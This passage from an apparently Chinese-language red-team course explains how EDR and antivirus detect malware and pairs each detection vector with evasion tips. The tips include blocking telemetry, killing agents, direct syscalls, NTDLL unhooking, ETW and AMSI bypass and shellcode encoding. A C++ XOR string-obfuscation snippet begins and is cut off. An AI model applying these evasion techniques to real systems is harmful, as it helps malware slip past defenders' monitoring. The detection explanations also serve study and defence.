<h4 id="EDR-示例（例如，CrowdStrike-Falcon）："><a href="#EDR-示例（例如，CrowdStrike-Falcon）：" class="headerlink" title="EDR 示例（例如，CrowdStrike Falcon）："></a><strong>EDR 示例（例如，CrowdStrike Falcon）：</strong></h4><ul>
<li><p>代理保持持久的 TLS 连接</p>
</li>
<li><p>每隔几秒发送一次遥测</p>
</li>
<li><p>离线时采用指数回退策略</p>
</li>
<li><p>可能从云端接收命令（例如，扫描或隔离）</p>
</li>
</ul>
<hr>
<h3 id="1-7-4-基于云数据的检测与防范"><a href="#1-7-4-基于云数据的检测与防范" class="headerlink" title="1.7.4 基于云数据的检测与防范"></a><strong>1.7.4 基于云数据的检测与防范</strong></h3><p>云端后端通常是 <strong>检测关联</strong> 发生的地方：</p>
<ul>
<li><p><strong>关联</strong> 跨端点的事件（例如，相同的文件哈希在多个机器上出现）</p>
</li>
<li><p><strong>检测</strong> 协同攻击、横向移动、特权提升</p>
</li>
<li><p><strong>触发</strong> 隔离操作（例如，杀死进程、阻止 IP、隔离主机）</p>
</li>
<li><p><strong>提供</strong> 分析给 SIEM&#x2F;XDR 平台</p>
</li>
</ul>
<p>这种架构使得即使本地代理被绕过，只要部分遥测数据到达云端，仍然可以进行检测。</p>
<hr>
<h3 id="1-7-5-绕过机会与局限性"><a href="#1-7-5-绕过机会与局限性" class="headerlink" title="1.7.5 绕过机会与局限性"></a><strong>1.7.5 绕过机会与局限性</strong></h3><h4 id="潜在绕过技术："><a href="#潜在绕过技术：" class="headerlink" title="潜在绕过技术："></a><strong>潜在绕过技术：</strong></h4><ul>
<li><p>阻止与云端 IP&#x2F;域的出站流量</p>
</li>
<li><p>检测并终止 EDR 代理进程或服务</p>
</li>
<li><p>DNS 欺骗或 TLS 拦截（如果没有证书固定，则较难）</p>
</li>
<li><p>伪造数据并自定义代理模仿（高级）</p>
</li>
<li><p>通过过载或洪水遥测通道来隐藏恶意活动</p>
</li>
<li><p>完全在内存中操作，以避免文件系统和注册表 I&#x2F;O</p>
</li>
</ul>
<h4 id="绕过的局限性："><a href="#绕过的局限性：" class="headerlink" title="绕过的局限性："></a><strong>绕过的局限性：</strong></h4><ul>
<li><p>一些 EDR 在 <strong>内核模式</strong> 下运行，更难通过没有驱动程序的方式禁用</p>
</li>
<li><p>代理通常有 <strong>自我防御机制</strong></p>
</li>
<li><p>云端关联能够通过模式检测 “低噪音” 的威胁</p>
</li>
<li><p>一些代理在本地执行 <strong>零信任策略</strong>（在发送数据前就会阻止）</p>
</li>
</ul>
<hr>
<h3 id="1-7-6-红队考虑事项"><a href="#1-7-6-红队考虑事项" class="headerlink" title="1.7.6 红队考虑事项"></a><strong>1.7.6 红队考虑事项</strong></h3><ul>
<li><p>了解 EDR 使用的 <strong>域&#x2F;IP</strong>（例如，通过 Wireshark 或 <code>netstat</code>）</p>
</li>
<li><p>测试 <strong>阻止通信</strong> 是否会影响检测</p>
</li>
<li><p>评估 <strong>延迟遥测提交</strong> 与实时事件的差异</p>
</li>
<li><p>监视代理日志 <code>%ProgramData%</code> 或 <code>C:\Program Files\</code>（某些代理可能留下明确的痕迹）</p>
</li>
<li><p>使用 <strong>支持代理的植入</strong>，使其能够与企业流量融合</p>
</li>
</ul>
<hr>
<h3 id="1-7-7-实际案例"><a href="#1-7-7-实际案例" class="headerlink" title="1.7.7 实际案例"></a><strong>1.7.7 实际案例</strong></h3><p>攻击者使用 <code>Reflective DLL Injection</code> 向 Cobalt Strike beacon 注入 shellcode。就本地 EDR 代理而言，可能不会立即标记此操作。然而：</p>
<ul>
<li><p><strong>DLL 哈希</strong> 在多个主机上出现。</p>
</li>
<li><p><strong>父进程树</strong> 不一致。</p>
</li>
<li><p><strong>命令与控制 IP</strong> 已在 VirusTotal 上报告。</p>
</li>
</ul>
<p>随着代理将日志发送到云端，EDR 后端将关联这些模式，并在所有受影响的主机上触发警报——即使初次执行绕过了本地启发式检测。</p>
<hr>
<p> <strong>总结</strong></p>
<p>EDR 代理-云之间的通信是 <strong>检测链中的关键环节</strong>，使得大规模的关联和响应成为可能。尽管攻击者可能会尝试阻止或伪造这些通信，但要做到不引起防御者警觉，需要 <strong>隐蔽性</strong>、<strong>精准性</strong>，以及对底层遥测架构的深入理解。</p>
<h2 id="AV-EDR-绕过实用技术-1-8-常见的-AV-EDR-检测向量：遥测、日志、缓冲区和系统调用跟踪"><a href="#AV-EDR-绕过实用技术-1-8-常见的-AV-EDR-检测向量：遥测、日志、缓冲区和系统调用跟踪" class="headerlink" title="AV&#x2F;EDR 绕过实用技术 - 1.8 - 常见的 AV&#x2F;EDR 检测向量：遥测、日志、缓冲区和系统调用跟踪"></a>AV&#x2F;EDR 绕过实用技术 - 1.8 - 常见的 AV&#x2F;EDR 检测向量：遥测、日志、缓冲区和系统调用跟踪</h2><p>现代 EDR 和病毒防护引擎依赖多种 <strong>观察向量</strong> 来检测恶意行为。这些向量不仅限于简单的文件扫描，还包括对进程行为、内存活动、系统调用和遥测数据的动态监控。了解这些向量对于设计有效的绕过技术至关重要。</p>
<hr>
<h3 id="1-8-1-遥测收集"><a href="#1-8-1-遥测收集" class="headerlink" title="1.8.1 遥测收集"></a><strong>1.8.1 遥测收集</strong></h3><p><strong>遥测</strong> 指的是从终端持续收集的行为数据流，包括：</p>
<ul>
<li><p>进程创建与终止（<code>CreateProcess</code>，<code>NtCreateProcessEx</code>）</p>
</li>
<li><p>模块加载（<code>LoadLibrary</code>，<code>LdrLoadDll</code>）</p>
</li>
<li><p>文件访问与修改</p>
</li>
<li><p>注册表读取&#x2F;写入操作</p>
</li>
<li><p>网络活动（出站&#x2F;入站连接）</p>
</li>
<li><p>父子进程关系（进程树谱系）</p>
</li>
</ul>
<p>遥测数据提供 <strong>上下文感知</strong>，使得 EDR 能够检测事件链（例如，MS Office → PowerShell → 网络连接）。</p>
<p><strong>绕过技巧：</strong> 在预期的父子进程链中操作，通过挂起进程延迟遥测，或注入到良性进程（例如，<code>explorer.exe</code>，<code>svchost.exe</code>）中。</p>
<hr>
<h3 id="1-8-2-日志监控与审计日志"><a href="#1-8-2-日志监控与审计日志" class="headerlink" title="1.8.2 日志监控与审计日志"></a><strong>1.8.2 日志监控与审计日志</strong></h3><p>EDR 常常利用 Windows 本地 <strong>审计日志</strong> 和 <strong>事件追踪日志</strong>，例如：</p>
<ul>
<li><p><strong>事件查看器日志</strong>（例如，进程创建的事件 ID 4688，文件共享访问的事件 ID 5140）</p>
</li>
<li><p><strong>Sysmon 日志</strong>（如果已部署），用于：</p>
<ul>
<li><p>文件创建（事件 ID 11）</p>
</li>
<li><p>注册表修改（事件 ID 13）</p>
</li>
<li><p>镜像加载（事件 ID 7）</p>
</li>
<li><p>网络连接（事件 ID 3）</p>
</li>
</ul>
</li>
</ul>
<p>这些日志通常会本地存储，并传输到集中式 SIEM 或 XDR 平台。</p>
<p><strong>绕过技巧：</strong> 禁用或篡改 Sysmon（有风险），或者完全在内存中操作以避免生成日志事件。</p>
<hr>
<h3 id="1-8-3-缓冲区分析与内存监控"><a href="#1-8-3-缓冲区分析与内存监控" class="headerlink" title="1.8.3 缓冲区分析与内存监控"></a><strong>1.8.3 缓冲区分析与内存监控</strong></h3><p>现代 EDR 会进行 <strong>内存内省</strong> 来检测：</p>
<ul>
<li><p><strong>注入的 shellcode</strong> 或反射式 DLL</p>
</li>
<li><p><strong>来自非镜像区的代码执行</strong>（例如，RWX 内存）</p>
</li>
<li><p><strong>不寻常的内存权限</strong>（例如，PAGE_EXECUTE_READWRITE）</p>
</li>
<li><p><strong>压缩或加密负载的熵分析</strong></p>
</li>
</ul>
<p>它们通过周期性 <strong>缓冲区扫描</strong> 运行进程，检查内存中的异常，如 PE 头信息、通过哈希解析的 API 或大的堆内存分配。</p>
<p><strong>绕过技巧：</strong> 使用内存加密（仅在执行时解密），将负载存储在看似无害的缓冲区中（例如，图像数据），或通过良性 DLL 执行跳板技术。</p>
<hr>
<h3 id="1-8-4-系统调用跟踪与-API-使用"><a href="#1-8-4-系统调用跟踪与-API-使用" class="headerlink" title="1.8.4 系统调用跟踪与 API 使用"></a><strong>1.8.4 系统调用跟踪与 API 使用</strong></h3><p>最关键的检测向量之一是 <strong>系统调用（syscall）跟踪</strong>：</p>
<ul>
<li><p><code>ntdll.dll</code> 中的钩子拦截调用，如 <code>NtAllocateVirtualMemory</code>、<code>NtWriteVirtualMemory</code>、<code>NtCreateThreadEx</code></p>
</li>
<li><p>用户空间 EDR 组件跟踪调用堆栈、参数和调用来源</p>
</li>
<li><p>一些高级解决方案监控 <strong>内核模式下的 syscalls</strong> 或通过 <strong>ETW</strong> 进行跟踪</p>
</li>
</ul>
<p>EDR 可能会跟踪 <strong>syscall 的顺序与频率</strong>，不寻常的调用链可能会表明利用或注入行为。</p>
<p><strong>绕过技巧：</strong></p>
<ul>
<li><p>使用 <strong>直接系统调用</strong>（绕过 API 存根）</p>
</li>
<li><p>使用 <strong>间接系统调用存根</strong>（如 SysWhispers，Hell’s Gate）</p>
</li>
<li><p>随机化调用顺序或插入无害调用以混入正常流量</p>
</li>
</ul>
<hr>
<h3 id="1-8-5-行为图与模式识别"><a href="#1-8-5-行为图与模式识别" class="headerlink" title="1.8.5 行为图与模式识别"></a><strong>1.8.5 行为图与模式识别</strong></h3><p>现代 EDR 会基于遥测数据和系统调用跟踪构建 <strong>行为图</strong>：</p>
<ul>
<li><p>每个进程和事件为一个节点</p>
</li>
<li><p>关系（例如，注入、文件写入、DNS 解析）构成边</p>
</li>
<li><p>图谱会被用来分析已知攻击模式（例如，LOLBAS 滥用、信标行为）</p>
</li>
</ul>
<p><strong>示例：</strong><br>攻击者滥用 <code>MSBuild.exe</code> 执行 shellcode。EDR 会根据行为图：</p>
<ul>
<li><p>追踪 MSBuild 的父进程（例如，Outlook）</p>
</li>
<li><p>文件操作</p>
</li>
<li><p>向可疑域发送 DNS 请求</p>
</li>
<li><p>内存写入与线程创建</p>
</li>
</ul>
<p>即使 shellcode 本身没有已知的签名，<strong>模式</strong> 本身也可能触发警报。</p>
<p><strong>绕过技巧：</strong> 打破预期的图谱模式（例如，将操作分散到多个进程），或保持低调（例如，休眠信标、分阶段加载负载）。</p>
<hr>
<h3 id="1-8-6-实时与延迟分析"><a href="#1-8-6-实时与延迟分析" class="headerlink" title="1.8.6 实时与延迟分析"></a><strong>1.8.6 实时与延迟分析</strong></h3><p>检测可能是即时的（实时监控）或延后的（后处理）：</p>
<ul>
<li><p><strong>实时分析：</strong> 用户空间钩子、ETW 消费者、进程注入警报</p>
</li>
<li><p><strong>延迟分析：</strong> 内存快照、云端关联、后端的机器学习分析</p>
</li>
</ul>
<p>这意味着隐蔽负载可能在 <strong>被捕获之前</strong> 执行——但防御者仍然能够通过取证数据获取信息。</p>
<p><strong>红队启示：</strong> 永远不要认为成功意味着未被检测到。事后分析可能揭示所有细节。</p>
<hr>
<h3 id="1-8-7-实际检测向量表"><a href="#1-8-7-实际检测向量表" class="headerlink" title="1.8.7 实际检测向量表"></a><strong>1.8.7 实际检测向量表</strong></h3><table>
<thead>
<tr>
<th><strong>向量</strong></th>
<th><strong>监控方式</strong></th>
<th><strong>用途</strong></th>
</tr>
</thead>
<tbody><tr>
<td>系统调用</td>
<td>用户空间钩子、ETW、内核</td>
<td>进程注入、漏洞利用</td>
</tr>
<tr>
<td>内存缓冲区</td>
<td>代理扫描、内核驱动</td>
<td>Shellcode、反射 DLL</td>
</tr>
<tr>
<td>文件访问</td>
<td>Sysmon、ETW、文件系统钩子</td>
<td>Droppers、Stagers</td>
</tr>
<tr>
<td>网络</td>
<td>代理、ETW、NDIS 过滤器</td>
<td>C2 检测、DNS 隧道</td>
</tr>
<tr>
<td>注册表</td>
<td>注册表过滤驱动</td>
<td>持久性、负载加载</td>
</tr>
<tr>
<td>进程树</td>
<td>内核 + 代理</td>
<td>LOLBAS、异常行为</td>
</tr>
<tr>
<td>熵&#x2F;签名</td>
<td>静态扫描器</td>
<td>打包文件、混淆</td>
</tr>
</tbody></table>
<hr>
<p> <strong>总结</strong></p>
<p>EDR 不仅依赖于 <strong>单一的检测向量</strong>，而是将多个来源的检测信息结合起来——遥测、日志、内存、系统调用图谱，以构建活动的全面图像。绕过这些检测需要 <strong>多层次的混淆</strong>、深入了解 Windows 内部结构，并不断适应 <strong>行为分析引擎</strong>。</p>
<h2 id="AV-EDR-绕过实用技术-1-9-传统杀毒软件的局限性"><a href="#AV-EDR-绕过实用技术-1-9-传统杀毒软件的局限性" class="headerlink" title="AV&#x2F;EDR 绕过实用技术 - 1.9 - 传统杀毒软件的局限性"></a>AV&#x2F;EDR 绕过实用技术 - 1.9 - 传统杀毒软件的局限性</h2><p>尽管现代端点安全技术不断进步，传统的杀毒（AV）软件仍然存在诸多架构和战略上的局限性。这些弱点可以被熟练的攻击者利用来绕过检测、维持持久性以及执行负载而不触发警报。</p>
<hr>
<h3 id="1-9-1-基于签名的依赖"><a href="#1-9-1-基于签名的依赖" class="headerlink" title="1.9.1 基于签名的依赖"></a><strong>1.9.1 基于签名的依赖</strong></h3><p>传统的 AV 重度依赖 <strong>基于签名的检测</strong>：</p>
<ul>
<li><p>扫描文件中与已知恶意软件匹配的字节模式。</p>
</li>
<li><p>签名存储在本地数据库中并定期更新。</p>
</li>
</ul>
<p><strong>局限性：</strong></p>
<ul>
<li><p>任何修改（多态性、加密、打包）都会使签名无效。</p>
</li>
<li><p>新的恶意软件或零日攻击在签名更新之前无法检测。</p>
</li>
<li><p>AV 无法检测 <strong>无文件恶意软件</strong> 或 <strong>内存执行技术</strong>。</p>
</li>
</ul>
<p><strong>绕过技巧：</strong> 使用自定义打包工具、多态编码器，或在运行时动态生成负载，以避免签名匹配。</p>
<hr>
<h3 id="1-9-2-缺乏行为上下文"><a href="#1-9-2-缺乏行为上下文" class="headerlink" title="1.9.2 缺乏行为上下文"></a><strong>1.9.2 缺乏行为上下文</strong></h3><p>杀毒引擎通常 <strong>缺乏实时行为感知</strong>：</p>
<ul>
<li><p>它们不会跟踪系统调用链、进程树或执行图。</p>
</li>
<li><p>许多 AV 只在 <strong>文件级</strong> 或 <strong>进程级</strong> 进行检测，缺乏更广泛的攻击上下文。</p>
</li>
</ul>
<p><strong>后果：</strong></p>
<ul>
<li><p><strong>滥用土地上的二进制文件（LOLBAS）</strong>（例如，<code>certutil.exe</code>，<code>regsvr32.exe</code>）可能被忽视。</p>
</li>
<li><p><strong>通过 Office 宏、MSI 文件、HTA 执行</strong>可以绕过基础的 AV 扫描。</p>
</li>
</ul>
<p><strong>绕过技巧：</strong> 使用良性工具作为加载器或加载器，并依赖间接执行路径。</p>
<hr>
<h3 id="1-9-3-有限的内存检查"><a href="#1-9-3-有限的内存检查" class="headerlink" title="1.9.3 有限的内存检查"></a><strong>1.9.3 有限的内存检查</strong></h3><p>大多数 AV 并未有效地监控 <strong>运行时内存行为</strong>：</p>
<ul>
<li><p>内存注入、shellcode 阶段和 DLL 空洞化通常无法被检测到。</p>
</li>
<li><p>反射式 DLL 注入或内存修补的 PE 注入可以绕过静态分析。</p>
</li>
</ul>
<p><strong>局限性：</strong></p>
<ul>
<li><p>AV 通常扫描磁盘上的文件，而不是内存缓冲区。</p>
</li>
<li><p>带有可执行权限的内存区域（例如，RWX）通常不会被监控。</p>
</li>
</ul>
<p><strong>绕过技巧：</strong> 使用反射式加载器，避免接触磁盘，确保负载仅在内存中运行。</p>
<hr>
<h3 id="1-9-4-静态启发式规则"><a href="#1-9-4-静态启发式规则" class="headerlink" title="1.9.4 静态启发式规则"></a><strong>1.9.4 静态启发式规则</strong></h3><p>一些 AV 实施 <strong>启发式规则</strong> 以进行异常检测，但：</p>
<ul>
<li><p>规则通常较为僵化，存在较高的误报风险。</p>
</li>
<li><p>它们专注于表面上的指示符，例如可疑的文件名、不常见的 API 使用或异常的文件大小。</p>
</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><p>攻击者可以通过模仿正常行为绕过启发式检测。</p>
</li>
<li><p>AV 很少对多次操作进行关联。</p>
</li>
</ul>
<p><strong>绕过技巧：</strong> 将恶意代码包裹在看起来干净的包装器或模板中，避免启发式规则（例如，签名的安装程序、干净的图标）。</p>
<hr>
<h3 id="1-9-5-API-覆盖不足"><a href="#1-9-5-API-覆盖不足" class="headerlink" title="1.9.5 API 覆盖不足"></a><strong>1.9.5 API 覆盖不足</strong></h3><p>传统 AV 主要监控常见的 API，例如：</p>
<ul>
<li><code>CreateProcess</code>、<code>WriteFile</code>、<code>OpenProcess</code> 等。</li>
</ul>
<p>但高级技术使用 <strong>不常见或未记录的 API</strong>，甚至 <strong>直接使用系统调用（syscall）</strong>，完全绕过这些检查。</p>
<p><strong>示例：</strong> 使用 <code>NtCreateThreadEx</code> 替代 <code>CreateRemoteThread</code>。</p>
<p><strong>绕过技巧：</strong> 重新实现低级 API，或直接使用系统调用来绕过基于 API 的检测。</p>
<hr>
<h3 id="1-9-6-无内核级可见性"><a href="#1-9-6-无内核级可见性" class="headerlink" title="1.9.6 无内核级可见性"></a><strong>1.9.6 无内核级可见性</strong></h3><p>大多数消费者级 AV 产品并不部署 <strong>内核模式驱动</strong> 进行深入检查：</p>
<ul>
<li><p>无法查看内部内核对象或内核回调。</p>
</li>
<li><p>无法在内核级拦截系统调用。</p>
</li>
<li><p>检测伪造的 PPID、令牌操控或隐蔽注入的能力有限。</p>
</li>
</ul>
<p><strong>绕过技巧：</strong> 使用技术如 Early Bird 注入或 APC 排队，这些会在用户空间 AV 能够检查之前触发。</p>
<hr>
<h3 id="1-9-7-对混淆和打包的处理不当"><a href="#1-9-7-对混淆和打包的处理不当" class="headerlink" title="1.9.7 对混淆和打包的处理不当"></a><strong>1.9.7 对混淆和打包的处理不当</strong></h3><p>现代恶意软件使用：</p>
<ul>
<li><p>XOR、RC4、AES 加密负载。</p>
</li>
<li><p>字符串和导入混淆。</p>
</li>
<li><p>运行时解包（例如，UPX 或自定义存根）。</p>
</li>
</ul>
<p>AV 通常无法解包或仿真代码执行。</p>
<p><strong>绕过技巧：</strong> 使用自定义加密，动态解析导入，并以替代编码（如 IPv6、UUID、MAC 格式）隐藏 shellcode。</p>
<hr>
<h3 id="1-9-8-云关联延迟或缺失"><a href="#1-9-8-云关联延迟或缺失" class="headerlink" title="1.9.8 云关联延迟或缺失"></a><strong>1.9.8 云关联延迟或缺失</strong></h3><p>虽然一些 AV 现在提供基于云的扫描（例如，Windows Defender 云保护）：</p>
<ul>
<li><p>不是所有事件都会发送到云端进行分析。</p>
</li>
<li><p>离线系统或被阻止的遥测会导致更新延迟。</p>
</li>
<li><p>云签名可能会被修改过的负载绕过。</p>
</li>
</ul>
<p><strong>绕过技巧：</strong> 在测试期间阻止遥测域，并了解哪些工件会发送到云端。</p>
<hr>
<h3 id="1-9-9-AV-绕过是一场猫捉老鼠的游戏"><a href="#1-9-9-AV-绕过是一场猫捉老鼠的游戏" class="headerlink" title="1.9.9 AV 绕过是一场猫捉老鼠的游戏"></a><strong>1.9.9 AV 绕过是一场猫捉老鼠的游戏</strong></h3><p>攻击者和防御者之间处于 <strong>持续的军备竞赛</strong>：</p>
<ul>
<li><p>每种绕过技术最终都会被检测并修复。</p>
</li>
<li><p>工具如 <code>Veil</code>、<code>Shellter</code>、<code>Donut</code>、<code>ScareCrow</code>、<code>Invoke-Obfuscation</code> 等会随着 AV 检测的进步而不断涌现。</p>
</li>
</ul>
<p><strong>红队建议：</strong> 始终将负载在多个引擎（例如，隔离的虚拟机或离线的 VirusTotal 克隆）上进行测试，并频繁迭代。</p>
<hr>
<p> <strong>总结</strong></p>
<p>传统的杀毒软件提供了基础的端点保护，但它们存在以下缺点：</p>
<ul>
<li><p>静态的检测方法。</p>
</li>
<li><p>有限的内存感知能力。</p>
</li>
<li><p>对系统调用和行为的覆盖不足。</p>
</li>
<li><p>对现代攻击向量的抵抗力差。</p>
</li>
</ul>
<p>对于进攻性操作，了解这些局限性有助于量身定制绕过技术，而防御者则需要转向 <strong>基于行为和上下文丰富的检测策略</strong>（例如，EDR、XDR、UEBA）。</p>
<h1 id="模块-2-用于规避的-C-C"><a href="#模块-2-用于规避的-C-C" class="headerlink" title="模块 2 - 用于规避的 C&#x2F;C++"></a>模块 2 - 用于规避的 C&#x2F;C++</h1><h2 id="AV-EDR-绕过实用技术-2-1-为什么使用-C-C-进行绕过"><a href="#AV-EDR-绕过实用技术-2-1-为什么使用-C-C-进行绕过" class="headerlink" title="AV&#x2F;EDR 绕过实用技术 - 2.1 - 为什么使用 C&#x2F;C++ 进行绕过"></a>AV&#x2F;EDR 绕过实用技术 - 2.1 - 为什么使用 C&#x2F;C++ 进行绕过</h2><p>C 和 C++ 是进行低级系统操作和绕过 AV&#x2F;EDR 的最有效语言之一。它们与硬件的亲密关系、对内存的直接访问，以及没有受控运行时的特点，使它们成为隐秘操作的理想选择。</p>
<hr>
<h3 id="2-1-1-–-直接内存管理"><a href="#2-1-1-–-直接内存管理" class="headerlink" title="2.1.1 – 直接内存管理"></a><strong>2.1.1 – 直接内存管理</strong></h3><p>C&#x2F;C++ 允许手动控制内存分配和保护，开发人员可以：</p>
<ul>
<li><p>使用 <code>VirtualAlloc</code>、<code>HeapAlloc</code> 或自定义分配器分配内存。</p>
</li>
<li><p>使用 <code>VirtualProtect</code> 改变内存保护（例如，RW → RX）。</p>
</li>
<li><p>从动态分配的内存区域执行代码。</p>
</li>
<li><p>实现传统托管语言（如 Python 或 .NET）无法复制的自定义堆&#x2F;恶意载荷加载流程。</p>
</li>
</ul>
<p>这对于 <strong>无文件负载</strong>、<strong>阶段性载荷</strong> 和 <strong>内存执行链</strong> 至关重要。</p>
<hr>
<h3 id="2-1-2-–-不依赖于托管运行时"><a href="#2-1-2-–-不依赖于托管运行时" class="headerlink" title="2.1.2 – 不依赖于托管运行时"></a><strong>2.1.2 – 不依赖于托管运行时</strong></h3><p>像 Python、PowerShell 或 C# 等语言依赖解释器或 .NET CLR，这些运行时通常会被安全产品监控或限制：</p>
<ul>
<li><p>C&#x2F;C++ 二进制文件不需要 .NET 或脚本引擎。</p>
</li>
<li><p>它们本地运行在 Windows 上，减少了行为分析的攻击面。</p>
</li>
<li><p>托管运行时可能在恶意行为发生之前触发启发式或基于机器学习的警报。</p>
</li>
</ul>
<p>C&#x2F;C++ 二进制文件本质上更难分析，除非它们被解包或反编译。</p>
<hr>
<h3 id="2-1-3-–-通过-API-混淆实现隐匿"><a href="#2-1-3-–-通过-API-混淆实现隐匿" class="headerlink" title="2.1.3 – 通过 API 混淆实现隐匿"></a><strong>2.1.3 – 通过 API 混淆实现隐匿</strong></h3><p>在 C&#x2F;C++ 中，可以在运行时解析函数导入，防止 AV&#x2F;EDR 静态识别关键指标。示例如下：</p>
<ul>
<li><p>通过 <code>LoadLibraryA</code> 和 <code>GetProcAddress</code> 手动解析 API。</p>
</li>
<li><p>实现自己的 <strong>PEB 遍历</strong> 来查找基址并解析函数指针，无需导入。</p>
</li>
<li><p>使用 <strong>基于哈希的 API 解析</strong>，而不是存储字符串名称。</p>
</li>
</ul>
<p>这使得静态引擎更难检测到像 <code>CreateRemoteThread</code>、<code>WriteProcessMemory</code> 等常见的 API 调用。</p>
<hr>
<h3 id="2-1-4-–-自定义-PE-结构和入口点"><a href="#2-1-4-–-自定义-PE-结构和入口点" class="headerlink" title="2.1.4 – 自定义 PE 结构和入口点"></a><strong>2.1.4 – 自定义 PE 结构和入口点</strong></h3><p>C&#x2F;C++ 允许你：</p>
<ul>
<li><p>定义自定义入口点（绕过 <code>main</code> 或 <code>WinMain</code>）。</p>
</li>
<li><p>修改 PE 头数据、节名称或删除导入表。</p>
</li>
<li><p>添加垃圾节或增加熵来迷惑 AV 启发式检测。</p>
</li>
<li><p>使用 <strong>多态性</strong> 或 <strong>变形技术</strong> 来生成每个版本。</p>
</li>
</ul>
<p>你可以完全控制二进制布局、执行流和元数据，从而绕过传统扫描器。</p>
<hr>
<h3 id="2-1-5-–-与-Windows-API-和内部结构集成"><a href="#2-1-5-–-与-Windows-API-和内部结构集成" class="headerlink" title="2.1.5 – 与 Windows API 和内部结构集成"></a><strong>2.1.5 – 与 Windows API 和内部结构集成</strong></h3><p>你可以直接与 Windows 内部结构进行交互，使用本地 API：</p>
<ul>
<li><p>访问 PEB 和 TEB 结构进行内部状态检查（例如，已加载模块、调试器存在）。</p>
</li>
<li><p>使用 <code>Nt*</code> 和 <code>Zw*</code> 系统调用，通过 NTDLL。</p>
</li>
<li><p>构建加载程序和注入器，绕过正常的 Windows 加载程序，从而避免用户空间的钩子。</p>
</li>
</ul>
<p>C&#x2F;C++ 提供了实现高级技术所需的灵活性，比如：</p>
<ul>
<li><p>手动映射模块。</p>
</li>
<li><p>自定义系统调用存根。</p>
</li>
<li><p>修补钩住的函数（例如，<code>unhooking</code> NTDLL）。</p>
</li>
<li><p>绕过 ETW、AMSI 和 WER。</p>
</li>
</ul>
<hr>
<h3 id="2-1-6-–-完全本地性能和时序控制"><a href="#2-1-6-–-完全本地性能和时序控制" class="headerlink" title="2.1.6 – 完全本地性能和时序控制"></a><strong>2.1.6 – 完全本地性能和时序控制</strong></h3><p>在恶意环境中（例如沙箱、EDR 监控），性能和时序至关重要：</p>
<ul>
<li><p>C&#x2F;C++ 允许使用 <code>QueryPerformanceCounter</code>、<code>RDTSC</code> 或内联汇编进行 <strong>精确时序操作</strong>。</p>
</li>
<li><p>有助于 <strong>反调试</strong>、<strong>反虚拟机</strong> 或 <strong>反沙箱</strong> 逻辑（例如，检测缓慢的睡眠、时间加速）。</p>
</li>
<li><p>执行速度比高级脚本更快，且更加不可预测。</p>
</li>
</ul>
<hr>
<h3 id="2-1-7-–-自定义混淆和打包技术"><a href="#2-1-7-–-自定义混淆和打包技术" class="headerlink" title="2.1.7 – 自定义混淆和打包技术"></a><strong>2.1.7 – 自定义混淆和打包技术</strong></h3><p>你可以实现：</p>
<ul>
<li><p>自定义 <strong>加密和解密</strong> 例程（XOR、AES、RC4）。</p>
</li>
<li><p>自定义打包器或加载器来保护负载。</p>
</li>
<li><p>使用编码字符串、指令替换或控制流扁平化的多层混淆。</p>
</li>
</ul>
<p>通过避免依赖已知的打包器或混淆工具，可以绕过基于签名和启发式的分析。</p>
<hr>
<h3 id="2-1-8-–-总结"><a href="#2-1-8-–-总结" class="headerlink" title="2.1.8 – 总结"></a><strong>2.1.8 – 总结</strong></h3><table>
<thead>
<tr>
<th>特性</th>
<th>绕过的好处</th>
</tr>
</thead>
<tbody><tr>
<td>手动内存管理</td>
<td>使得 shellcode 执行和隐匿加载成为可能</td>
</tr>
<tr>
<td>运行时 API 解析</td>
<td>避免静态 IAT 和签名检测</td>
</tr>
<tr>
<td>PE 自定义</td>
<td>混淆静态分析工具</td>
</tr>
<tr>
<td>本地执行</td>
<td>绕过托管运行时监控</td>
</tr>
<tr>
<td>时序与反分析控制</td>
<td>绕过沙箱和虚拟机检测</td>
</tr>
<tr>
<td>混淆与打包</td>
<td>隐藏 AV&#x2F;EDR 的意图和结构</td>
</tr>
</tbody></table>
<p>C&#x2F;C++ 提供了全面的控制和灵活性，使其成为进行 AV&#x2F;EDR 绕过操作的理想选择。</p>
<h2 id="AV-EDR规避实战技术-2-2-避免静态检测（签名）"><a href="#AV-EDR规避实战技术-2-2-避免静态检测（签名）" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 2.2 - 避免静态检测（签名）"></a><strong>AV&#x2F;EDR规避实战技术 - 2.2 - 避免静态检测（签名）</strong></h2><h3 id="2-2-避免静态检测（签名）"><a href="#2-2-避免静态检测（签名）" class="headerlink" title="2.2 - 避免静态检测（签名）"></a><strong>2.2 - 避免静态检测（签名）</strong></h3><p>静态检测依赖于分析二进制文件<strong>在执行之前</strong>，无需其运行。此分析包括匹配<strong>签名</strong>、<strong>哈希</strong>、<strong>启发式方法</strong>，甚至通过<strong>机器学习</strong>模型检查字符串、API调用和二进制结构。</p>
<p>在本节中，我们将探讨使用C&#x2F;C++和自定义二进制修改来规避静态检测的方法。</p>
<hr>
<h3 id="2-2-1-–-字符串混淆"><a href="#2-2-1-–-字符串混淆" class="headerlink" title="2.2.1 – 字符串混淆"></a><strong>2.2.1 – 字符串混淆</strong></h3><p>大多数AV引擎扫描<strong>硬编码字符串</strong>，例如API名称、命令行参数、URL或Shellcode标记。为了避免检测：</p>
<h4 id="示例：XOR编码字符串"><a href="#示例：XOR编码字符串" class="headerlink" title="示例：XOR编码字符串"></a>示例：XOR编码字符串</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">xor_decrypt</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* input, <span class="hljs-type">char</span> key)</span> </span>&#123;<br>    <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span>(input);<br>    <span class="hljs-type">char</span>* output = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[len + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span 